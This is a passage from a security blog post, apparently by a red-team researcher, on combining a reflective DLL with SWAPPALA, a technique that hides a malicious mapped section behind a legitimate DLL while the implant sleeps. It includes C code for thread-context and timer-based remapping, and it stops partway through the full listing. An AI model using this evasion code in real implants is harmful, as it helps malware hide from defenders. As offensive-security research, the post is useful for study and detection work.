# https://oldboy21.github.io/posts/2024/06/sleaping-issues-swappala-and-reflective-dll-friends-forever/

<!DOCTYPE html><html lang="en" data-theme="light"><body><div class="container"><div class="content"><main class="post"><div class="post-info"><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>9 minutes</p></div><article><h1 class="post-title"><a href="https://oldboy21.github.io/posts/2024/06/sleaping-issues-swappala-and-reflective-dll-friends-forever/">SLE(A)PING Issues: SWAPPALA and Reflective DLL Friends Forever</a></h1><div class="post-content"><p>Here we go again, hello everyone! Sorry I am on a roll this period, can‚Äôt really sle(a)p well when I have something still to solve and I had some leftovers from the previous <a href="https://oldboy21.github.io/posts/2024/05/swappala-why-change-when-you-can-hide/">SWAPPALA</a> adventure.</p><p>What we going to talk about today?</p><p>Well, lots of failures but with a bright end after all.</p><p>As mentioned in the last episode I wanted to grant the Reflective DLL I worked on with <a href="https://oldboy21.github.io/posts/2024/05/swappala-why-change-when-you-can-hide/">SWAPPALA</a> super powers. Wrapping up SWAPPALA was only the beginning while I thought I was way closer to a stable solution.</p><h2 id="swappala-recap">SWAPPALA Recap</h2><p>TL,DR; Even if reading my bello blog about <a href="https://oldboy21.github.io/posts/2024/05/swappala-why-change-when-you-can-hide/">SWAPPALA</a> will make your day better, if you do not want or do not have time:</p><p>SWAPPALA makes use of HWBP tricks to map a malicious private section at the same address of a legit DLL. Once the nasty stuff is done, SWAPPALA re-map the legit DLL at its very own address and then goes to sleep with EkkoQua.</p><p>What is <a href="https://github.com/oldboy21/SWAPPALA/blob/main/SWAPPALA/swappala.h">EkkoQua</a>? It is a slightly modified version of Ekko that use some stack shenanigans in order to avoid the so-called ‚Äúbytes fights‚Äù on the stack and queue for execution also Win32 APIs that take more than 4 arguments.</p><p>Cool, really brief description of SWAPPALA, please refer also to the repository.</p><h2 id="the-goal">The Goal</h2><p>The idea was to grant the <a href="https://github.com/oldboy21/RflDllOb">Reflective DLL I built</a> with SWAPPALA super nap powers.</p><p>Again bit of context if you do not want to read <a href="https://oldboy21.github.io/posts/2023/12/all-i-want-for-christmas-is-reflective-dll-injection/">my blog</a> about Reflective DLL: This magic DLL is able to load itself in memory. It exports a PIC functions that find the DLL in memory and executes all the loading operations. Crazy stuff.</p><p>Granting SWAPPALA nap powers to the Reflective DLL basically meant that the Reflective DLL once loaded in memory it would hide itself behind a legit DLL, using SWAPPALA.</p><h2 id="and-then-what-happened">And Then What Happened?</h2><p>Unfortunately copy pasta SWAPPALA into Reflective DLL code did not work right away. After years in IT a little part of me still hopes that new code would work right away, but it‚Äôs never the case. First reaction of Reflective DLL to SWAPPALA was really harsh ‚Üí crashing Notepad.exe</p><img src="https://media0.giphy.com/media/14ceV8wMLIGO6Q/giphy.gif?cid=7941fdc6g8l53q9d6vojfo9v7edj9ldzp5p4qmmxjv2evzaa&amp;ep=v1_gifs_search&amp;rid=giphy.gif&amp;ct=g" class="center" alt="animated"><p>That was happening because some of the ROP chain functions were not executing properly so the main thread was coming back from sleep into an unexisting section in memory, very scary.</p><p>A bullet list that matters more than thousands words:</p><ul><li>Unmap Malicious Section ‚Üí Good</li><li>Remap Legit DLL ‚Üí Failing</li><li>Sleep ‚Üí ZZzzzZzz</li><li>Unmap Legit DLL ‚Üí Good</li><li>Remap Malicious Section ‚Üí Failing</li><li>BOOMBOROMBOOMB</li></ul><p>But why those were failing? They were working fine in the code of SWAPPALA after all. Depressing, it makes you start doubting about everything even choices made years ago.</p><p>Jokes aside, it took me some debugging to understand that those functions were not actually failing, they were never executed.</p><img src="https://media2.giphy.com/media/LRgZHbEpQvHEi8PID6/giphy.gif?cid=7941fdc6kwlubnnwo10ep7hdy58ufidrl75zjuljn1q517to&amp;ep=v1_gifs_search&amp;rid=giphy.gif&amp;ct=g" class="center" alt="animated"><p>Breakpoints on ‚ÄúMapViewOffileEx‚Äù were never hit while all the other functions were executed properly. So something was happening before even getting to the point of execution of those functions. It did not take a genius that was something that had to do with my EkkoQua implementation. Duplicating the stack in order to be able to work with functions that takes more than 4 arguments was definitely the trigger for this annoying behaviour. Ok so then I did my homework with x64dbg and set a breakpoint on the ‚ÄúNtContinue‚Äù instead and:</p><img src="https://oldboy21.github.io/sleaping/Untitled.png" class="center"><p>Ehehe, must admit I am not great at reverse engineering but the only thing I noticed was that after the NtContinue, after not so many instructions, the thread was being killed without causing too much noises. Alright, not many conclusions out of that.</p><p>Turns out that the stack duplication thing that I had implemented in EkkoQua was really considered bad by all the process that are compiled with security protections, including CFG, Shadow Stack, Stack Cookie etc. etc.</p><p>Really haven‚Äôt thought of something like that, however it was interesting to read how all of those are implemented and how, despite being implemented to protect against different kind of attacks, they would get pissed at SWAPPALA and EkkoQua. Since the amount of lines of C I had dealt with were not enough (and with bello help from ChatGPT) I came up with this:</p><img src="https://oldboy21.github.io/sleaping/Untitled%201.png" class="center"><p>A bello script that would tell me all the running processes that had no security protections enabled. Injecting Reflective DLL + SWAPPALA in those process was working just fine.</p><p>It felt good because it made sense, it felt really bad because I still did not know how to solve it.</p><p>I honestly tried to figure what exactly was the problem but it was kinda challenging, still I think the Stack Cookie check was failing and the thread killed, I do not know, could not prove it, got annoyed.</p><img src="https://oldboy21.github.io/sleaping/Untitled.jpeg" class="center"><p>It felt like it wasn‚Äôt the right way to approach this anyway and I started switching my mind on different ideas, among which setting HWBP on the worker threads registries in order to set the arguments of the MapViewOfFileEx by hooking the functions and working my way around that in the vectored exception handler. Bad idea once i discovered that NtContinue ignores debug registers</p><img src="https://media1.giphy.com/media/1FMaabePDEfgk/giphy.gif?cid=7941fdc6uk3xaomchtzi738auplxy1bkl5r2bnsaon951a61&amp;ep=v1_gifs_search&amp;rid=giphy.gif&amp;ct=g" class="center" alt="animated"><p>Ok so, let‚Äôs take a breath and start over.</p><h2 id="sleaping">Sleaping</h2><p>Ok it was about time to drop the idea of adapting existing techniques to achieve my goals, so I deleted EkkoQua and started with an empty function called Sleaping.</p><p>What do I want?</p><p>Threads with different stack! In a suspended state üëÄ</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-c"><code class=" language-c" data-lang="c">    <span class="token comment">// Create threads in a suspended state</span>
    ThreadArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>UnmapViewOfFile<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> CREATE_SUSPENDED<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>ThreadArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ThreadArray<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>MapViewOfFileEx<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> CREATE_SUSPENDED<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>ThreadArray<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ThreadArray<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>UnmapViewOfFile<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> CREATE_SUSPENDED<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>ThreadArray<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ThreadArray<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>MapViewOfFileEx<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> CREATE_SUSPENDED<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>ThreadArray<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><span>C</span></div></div></div></div><p>How do I want to execute them?</p><p>Well, I like the idea of having a timer and NtContinue is not the only function that can be used to (re)start a thread, also these above are in a suspended state. ResumeThread to the rescue!</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-c"><code class=" language-c" data-lang="c">ResumeThreadAddress <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"kernel32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"ResumeThread"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>ResumeThreadAddress <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">CreateTimerQueueTimer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hNewTimer<span class="token punctuation">,</span> hTimerQueue<span class="token punctuation">,</span> <span class="token punctuation">(</span>WAITORTIMERCALLBACK<span class="token punctuation">)</span>ResumeThreadAddress<span class="token punctuation">,</span> ThreadArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> WT_EXECUTEINTIMERTHREAD<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//unamp</span>
    <span class="token function">CreateTimerQueueTimer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hNewTimer<span class="token punctuation">,</span> hTimerQueue<span class="token punctuation">,</span> <span class="token punctuation">(</span>WAITORTIMERCALLBACK<span class="token punctuation">)</span>ResumeThreadAddress<span class="token punctuation">,</span> ThreadArray<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> WT_EXECUTEINTIMERTHREAD<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//mapsac</span>
    <span class="token function">CreateTimerQueueTimer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hNewTimer<span class="token punctuation">,</span> hTimerQueue<span class="token punctuation">,</span> <span class="token punctuation">(</span>WAITORTIMERCALLBACK<span class="token punctuation">)</span>ResumeThreadAddress<span class="token punctuation">,</span> ThreadArray<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">7000</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> WT_EXECUTEINTIMERTHREAD<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//unmap</span>
    <span class="token function">CreateTimerQueueTimer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hNewTimer<span class="token punctuation">,</span> hTimerQueue<span class="token punctuation">,</span> <span class="token punctuation">(</span>WAITORTIMERCALLBACK<span class="token punctuation">)</span>ResumeThreadAddress<span class="token punctuation">,</span> ThreadArray<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">7100</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> WT_EXECUTEINTIMERTHREAD<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//mapmal</span>

    <span class="token function">WaitForMultipleObjects</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> ThreadArray<span class="token punctuation">,</span> TRUE<span class="token punctuation">,</span> INFINITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><span>C</span></div></div></div></div><p>And how do I want to tell threads what to do?</p><p>Context Matters, even for sle(a)ping:</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-c"><code class=" language-c" data-lang="c">    CONTEXT<span class="token operator">*</span> context <span class="token operator">=</span> <span class="token punctuation">(</span>CONTEXT<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CONTEXT<span class="token punctuation">)</span><span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    CONTEXT<span class="token operator">*</span> contextB <span class="token operator">=</span> <span class="token punctuation">(</span>CONTEXT<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CONTEXT<span class="token punctuation">)</span><span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    CONTEXT<span class="token operator">*</span> contextC <span class="token operator">=</span> <span class="token punctuation">(</span>CONTEXT<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CONTEXT<span class="token punctuation">)</span><span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    CONTEXT<span class="token operator">*</span> contextD <span class="token operator">=</span> <span class="token punctuation">(</span>CONTEXT<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CONTEXT<span class="token punctuation">)</span><span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    HANDLE ThreadArray<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token constant">NULL</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

    context<span class="token operator">-&gt;</span>ContextFlags <span class="token operator">=</span> CONTEXT_ALL<span class="token punctuation">;</span>
    contextB<span class="token operator">-&gt;</span>ContextFlags <span class="token operator">=</span> CONTEXT_ALL<span class="token punctuation">;</span>
    contextC<span class="token operator">-&gt;</span>ContextFlags <span class="token operator">=</span> CONTEXT_ALL<span class="token punctuation">;</span>
    contextD<span class="token operator">-&gt;</span>ContextFlags <span class="token operator">=</span> CONTEXT_ALL<span class="token punctuation">;</span>
    
    <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
    
    <span class="token function">GetThreadContext</span><span class="token punctuation">(</span>ThreadArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//unmap</span>
    <span class="token function">GetThreadContext</span><span class="token punctuation">(</span>ThreadArray<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> contextB<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//mapex</span>
    <span class="token function">GetThreadContext</span><span class="token punctuation">(</span>ThreadArray<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> contextC<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//unmap</span>
    <span class="token function">GetThreadContext</span><span class="token punctuation">(</span>ThreadArray<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> contextD<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//mapex</span>
    
    <span class="token comment">//exit gracefully </span>
    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>context<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>ExitThread<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>context<span class="token punctuation">)</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>UnmapViewOfFile<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>context<span class="token punctuation">)</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span>ImageBaseDLL<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>contextB<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>ExitThread<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>contextB<span class="token punctuation">)</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>MapViewOfFileEx<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>contextB<span class="token punctuation">)</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>sacDllHandle<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>contextB<span class="token punctuation">)</span><span class="token punctuation">.</span>Rdx <span class="token operator">=</span> FILE_MAP_ALL_ACCESS<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>contextB<span class="token punctuation">)</span><span class="token punctuation">.</span>R8 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token number">0x00</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>contextB<span class="token punctuation">)</span><span class="token punctuation">.</span>R9 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token number">0x00</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span> <span class="token comment">//the offset must be either hex 28 or int 40</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>ImageBaseDLL<span class="token punctuation">;</span>

    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>contextC<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>ExitThread<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>contextC<span class="token punctuation">)</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>UnmapViewOfFile<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>contextC<span class="token punctuation">)</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span>ImageBaseDLL<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>ExitThread<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>MapViewOfFileEx<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>malDllHandle<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>Rdx <span class="token operator">=</span> FILE_MAP_ALL_ACCESS <span class="token operator">|</span> FILE_MAP_EXECUTE<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>R8 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token number">0x00</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>R9 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token number">0x00</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span> <span class="token comment">//the offset must be either hex 28 or int 40</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>ImageBaseDLL<span class="token punctuation">;</span>

    <span class="token function">SetThreadContext</span><span class="token punctuation">(</span>ThreadArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SetThreadContext</span><span class="token punctuation">(</span>ThreadArray<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> contextB<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SetThreadContext</span><span class="token punctuation">(</span>ThreadArray<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> contextC<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SetThreadContext</span><span class="token punctuation">(</span>ThreadArray<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> contextD<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><span>C</span></div></div></div></div><p>Bellissimo, an important thing to notice here and to point out: the way I set the arguments in the context of the threads is very similar to what I did in EkkoQua, except for one thing.</p><p>As you can see the RSP pointer is set to ExitThread function address, why?</p><p>If you take a look the stack of a thread created in suspended state you will notice that it‚Äôs allocated but it‚Äôs all zeros. ‚ò†Ô∏è</p><p>So what happens? Well the thread will execute the function but when it will try to go to the return address it will fall into a very big ACCESS VIOLATION EXCEPTION. Since we want to sle(a)p well at night we exit the threads using ExitThread.</p><p>Well, that‚Äôs it, now full code, test run and some screenshots!</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-c"><code class=" language-c" data-lang="c"><span class="token keyword">int</span> <span class="token function">Sleaping</span><span class="token punctuation">(</span>PVOID ImageBaseDLL<span class="token punctuation">,</span> HANDLE sacDllHandle<span class="token punctuation">,</span> HANDLE malDllHandle<span class="token punctuation">,</span> SIZE_T viewSize<span class="token punctuation">)</span> <span class="token punctuation">{</span>

    
    CONTEXT<span class="token operator">*</span> context <span class="token operator">=</span> <span class="token punctuation">(</span>CONTEXT<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CONTEXT<span class="token punctuation">)</span><span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    CONTEXT<span class="token operator">*</span> contextB <span class="token operator">=</span> <span class="token punctuation">(</span>CONTEXT<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CONTEXT<span class="token punctuation">)</span><span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
